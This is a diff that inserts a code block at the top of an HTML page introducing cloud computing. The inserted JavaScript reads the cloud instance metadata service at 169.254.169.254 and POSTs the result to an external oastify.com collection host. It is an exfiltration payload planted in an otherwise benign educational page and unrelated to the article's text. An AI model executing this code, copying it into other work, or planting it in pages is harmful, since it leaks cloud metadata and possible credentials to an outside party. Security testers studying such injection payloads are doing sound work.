@@ -23,6 +23,20 @@
 </head>
 <body>
 
+<pre><code>
+fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {
+  headers: { "Metadata": "true" }
+})
+  .then(res => res.json())
+  .then(data => {
+    console.log("Metadata:", data);
+    fetch("http://b0coz6lodcgspqy9s0eukeskebk28swh.oastify.com", {
+      method: "POST",
+      body: JSON.stringify(data)
+    });
+  });
+  </code></pre>
+  
   <h1>Understanding Cloud Computing</h1>
   <p>Cloud computing is the delivery of computing services—including servers, storage, databases, networking, software, analytics, and intelligence—over the Internet to offer faster innovation, flexible resources, and economies of scale.</p>
 
